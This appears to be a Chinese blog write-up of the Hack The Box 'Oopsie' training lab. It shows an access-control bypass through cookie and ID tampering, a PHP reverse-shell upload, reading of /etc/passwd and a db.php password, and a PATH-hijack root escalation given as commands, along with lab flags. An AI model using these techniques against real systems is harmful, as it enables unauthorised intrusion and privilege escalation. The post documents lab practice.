---
title: 记模拟渗透-HTB-Tier2-2
published: 2022-03-27
description: "Hack The Box Tier2-2 Writeup."
# image: "./cover.webp"
tags: ["网络安全","Hack The Box", "靶场"]
category: 网络安全
draft: false
---

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648261753478-565f2f86-8502-45cb-a099-9ac7de618cce.png#averageHue=%23252b37&clientId=u9ec670b7-a472-4&from=paste&height=222&id=ue52676ac&originHeight=222&originWidth=860&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86222&status=done&style=none&taskId=u072b5d3e-f6f1-452d-93e7-7528ecd7736&title=&width=860)<br />使用nmap扫描<br />发现80端口开放http<br />打开网页

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648261785987-e86ce16e-f7e4-4435-b504-ad36b92f3483.png#averageHue=%236a4f8a&clientId=u9ec670b7-a472-4&from=paste&height=792&id=u5ab4d450&originHeight=792&originWidth=1244&originalType=binary&ratio=1&rotation=0&showTitle=false&size=985786&status=done&style=none&taskId=u86933477-83eb-4420-9515-de7dd605aa2&title=&width=1244)<br />发现没什么东西<br />打开F12看到里面有个类似登录的地址

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648261805353-533642ed-b31c-4167-9549-ae7c8ee11178.png#averageHue=%23c5e2eb&clientId=u9ec670b7-a472-4&from=paste&height=803&id=u10544de1&originHeight=803&originWidth=1275&originalType=binary&ratio=1&rotation=0&showTitle=false&size=577488&status=done&style=none&taskId=uae4c80c5-2ee4-450c-afe8-d7bea393017&title=&width=1275)

打开后，还真是。。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648261867666-c93d388e-ac23-4594-a516-0841a0b5bbdf.png#averageHue=%23aac0a9&clientId=u9ec670b7-a472-4&from=paste&height=826&id=uf56f7cab&originHeight=826&originWidth=1311&originalType=binary&ratio=1&rotation=0&showTitle=false&size=403760&status=done&style=none&taskId=u66034160-e690-45e3-8c1c-d6106f7bd22&title=&width=1311)<br />尝试<br />admin'# 无效

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648261928876-d070dbbd-97a9-4135-ab4e-c872f6ea0071.png#averageHue=%23dae0dd&clientId=u9ec670b7-a472-4&from=paste&height=416&id=u674bc268&originHeight=416&originWidth=489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142789&status=done&style=none&taskId=ue3a8caad-46b2-4f02-aa37-313703f5132&title=&width=489)<br />使用来宾账号登录<br />成功;<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648261993114-6d62ffb4-fdc8-4613-bfe2-5ddad791d159.png#averageHue=%2395a592&clientId=u9ec670b7-a472-4&from=paste&height=814&id=ua174f1ec&originHeight=814&originWidth=1271&originalType=binary&ratio=1&rotation=0&showTitle=false&size=809377&status=done&style=none&taskId=u667e5b42-52c8-4630-9694-5e630dd18a6&title=&width=1271)

尝试文件上传，发现需要admin账户<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262045423-a351b603-8a92-4d9e-ba64-3638d12b4830.png#averageHue=%23d3b798&clientId=u9ec670b7-a472-4&from=paste&height=705&id=u01018384&originHeight=705&originWidth=1296&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80729&status=done&style=none&taskId=u039f198c-6304-4d01-808b-0095580af1c&title=&width=1296)

在Account发现信息，发现上方地址栏ID=2 <br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262094367-66d5ca37-4759-4280-b806-6ad4ce50526e.png#averageHue=%23cfb494&clientId=u9ec670b7-a472-4&from=paste&height=542&id=u8089e074&originHeight=542&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70710&status=done&style=none&taskId=u7d87c1ef-a61a-4a12-a1b7-29a7bc8ac8b&title=&width=1158)<br />id改为1后，发现admin相关信息<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262156409-b51a9ae2-924f-48ad-b49b-8217bd5f85c8.png#averageHue=%23e2d0b0&clientId=u9ec670b7-a472-4&from=paste&height=492&id=u756b39e1&originHeight=492&originWidth=1037&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68252&status=done&style=none&taskId=u8e271ea7-13ef-4bab-94fc-069d33712c9&title=&width=1037)<br />一番查找，在F12里看到cookie可以借此修改，将信息改为admin的信息<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262187609-353ab894-c55d-4402-b3a6-13b10df8e0a9.png#averageHue=%23f4ecc7&clientId=u9ec670b7-a472-4&from=paste&height=787&id=u1c1fe1a0&originHeight=787&originWidth=1297&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134664&status=done&style=none&taskId=u06a965a1-4cc0-4167-90ac-3ac987d1e7a&title=&width=1297)


![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262331838-48382b3f-5e66-4c75-a163-a700e7045bfc.png#averageHue=%23fafafa&clientId=u9ec670b7-a472-4&from=paste&height=511&id=u9703e470&originHeight=511&originWidth=864&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62311&status=done&style=none&taskId=u0f6638af-760c-4395-83e0-06ad84c13c6&title=&width=864)

再次访问文件上传，通过了<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262349273-4ebc41ea-6646-4362-9691-44e1e9419241.png#averageHue=%23e4e2c9&clientId=u9ec670b7-a472-4&from=paste&height=807&id=u342bbb87&originHeight=807&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143490&status=done&style=none&taskId=ua9b05724-5f36-4801-b8ca-eb2f762673a&title=&width=1207)

生成shell，将IP和端口修改为自己监听的端口，并上传<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262675361-b91aba39-6d05-4258-a389-d5989f8423e5.png#averageHue=%23282d39&clientId=u9ec670b7-a472-4&from=paste&height=936&id=u289b6fd5&originHeight=936&originWidth=1625&originalType=binary&ratio=1&rotation=0&showTitle=false&size=429099&status=done&style=none&taskId=ue2c28702-08be-4461-8b8d-43db4c45324&title=&width=1625)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262862917-db53870b-f621-4371-952b-7e8b102aab80.png#averageHue=%23fbfafa&clientId=u9ec670b7-a472-4&from=paste&height=381&id=uad6da09f&originHeight=381&originWidth=601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35386&status=done&style=none&taskId=u37bc46b5-15a0-4044-a557-df9c9eb701e&title=&width=601)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262852825-b6bffbcc-bae8-4452-a684-2af8d153020e.png#averageHue=%23fefdfd&clientId=u9ec670b7-a472-4&from=paste&height=360&id=u9427f019&originHeight=360&originWidth=645&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23619&status=done&style=none&taskId=u2fee0b1f-ddce-435d-bd03-388863511dc&title=&width=645)<br />接下来，监听自己之前在文件中设置的端口<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648262963914-57f2d29e-c808-4412-bfd8-04f2e0a30766.png#averageHue=%23232732&clientId=u9ec670b7-a472-4&from=paste&height=118&id=ue20fd1c8&originHeight=118&originWidth=302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10399&status=done&style=none&taskId=u1c57fa45-33e6-4e18-9a2f-93983a09dc9&title=&width=302)

使用gobuster进行地址爆破<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648263297964-b21dd136-d739-4452-b0ad-e55337ead0f9.png#averageHue=%232f323d&clientId=u9ec670b7-a472-4&from=paste&height=512&id=u69ec84b5&originHeight=512&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113032&status=done&style=none&taskId=u365b7013-28ab-4f7e-aa98-4d13c07e6b2&title=&width=830)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648263433118-f3a157b4-95f4-4dc3-8d2e-a199c7b65fd0.png#averageHue=%23edead4&clientId=u9ec670b7-a472-4&from=paste&height=490&id=u7b2360ef&originHeight=490&originWidth=1132&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68759&status=done&style=none&taskId=u7d5f5ce8-2c73-4bef-a502-c0fe3164a10&title=&width=1132)

这里反弹后拿到shell，不过这个shell<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648263455304-b058a48b-c3b1-4723-b659-679aac21da89.png#averageHue=%23a1c9c1&clientId=u9ec670b7-a472-4&from=paste&height=839&id=u66758a11&originHeight=839&originWidth=1220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=231960&status=done&style=none&taskId=u21dd24fb-b117-4bbf-98af-e484d85d32f&title=&width=1220)

python3 打开伪终端

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648263665901-23c5ae52-f80b-46f4-bd07-f8026d6ccf42.png#clientId=u9ec670b7-a472-4&from=paste&height=444&id=uc15a1837&originHeight=444&originWidth=859&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105381&status=done&style=none&taskId=uc0b69904-0f42-420c-9b9a-082d522f9e1&title=&width=859)

在/etc/passwd文件下看到信息<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648263870325-1f865558-4312-4455-a186-56e0210bb4c1.png#clientId=u9ec670b7-a472-4&from=paste&height=811&id=u462e3419&originHeight=811&originWidth=868&originalType=binary&ratio=1&rotation=0&showTitle=false&size=267061&status=done&style=none&taskId=uaaef2ab7-55b1-4e3a-8e31-2533b4295ae&title=&width=868)

获得普通用户密钥<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648264300606-13925c44-0724-4460-95a6-49f74903b778.png#clientId=u9ec670b7-a472-4&from=paste&height=849&id=u98dc62d1&originHeight=849&originWidth=874&originalType=binary&ratio=1&rotation=0&showTitle=false&size=264037&status=done&style=none&taskId=uafc5abd1-6bd9-4d6b-abc7-48abc73c55f&title=&width=874)

www-data@oopsie:/home/robert$ cat user.txt<br />cat user.txt<br />f2c74ee8db7983851ab2a96a44eb7981

在此目录下的db.php发现用户密码<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648264786828-b2d7a16f-1791-44a5-996f-fc05f3befdbc.png#clientId=u9ec670b7-a472-4&from=paste&height=189&id=uabc3fd1e&originHeight=189&originWidth=640&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35501&status=done&style=none&taskId=uabd30227-569f-4910-a48f-b399d076904&title=&width=640)<br />www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php<br />cat db.php<br /><?php<br />$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');<br />?>

切换到robert账号<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648265362012-5f7b719c-f234-4e8b-8f0a-265e8eefab78.png#clientId=u9ec670b7-a472-4&from=paste&height=331&id=u1c755b90&originHeight=331&originWidth=702&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74132&status=done&style=none&taskId=u15bf093a-9cf2-4ea8-897e-c04948bf902&title=&width=702)


export PATH=/tmp:$PATH                //将/tmp目录设置为环境变量<br />cd /tmp/                            //切换到/tmp目录下<br />echo '/bin/sh' > cat                //在此构造恶意的cat命令<br />chmod +x cat                        //赋予执行权限

使用上面命令，成功提权ROOT<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648265779886-a3cca98f-11d4-4f3b-83ca-9be3be40c8e0.png#clientId=u9ec670b7-a472-4&from=paste&height=647&id=ud66eb1d3&originHeight=647&originWidth=656&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118675&status=done&style=none&taskId=u47599b95-2af9-43a0-9409-c91f9cfcb65&title=&width=656)

因为，我们修改了环境变量，所以调用的cat是恶意的，所以查看不了文件，这里使用tac命令查看。tac是将行数倒着输出，并不会将一句话的每个字符倒序输出，这里直接tac查看即可

=================================================================

后续内容不公开<br />原因-含有flag

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648265872418-c1c7da3b-0adf-4b9f-9c30-e60729a25f76.png#clientId=u9ec670b7-a472-4&from=paste&height=464&id=u61e8e71e&originHeight=464&originWidth=670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80785&status=done&style=none&taskId=u44a08d39-4141-4649-8fc0-eeeac714d3d&title=&width=670)<br />root@oopsie:/root# tac root.txt<br />~~tac root.txt~~<br />~~af13b0bee69f8a877c3faf667f7beacf~~

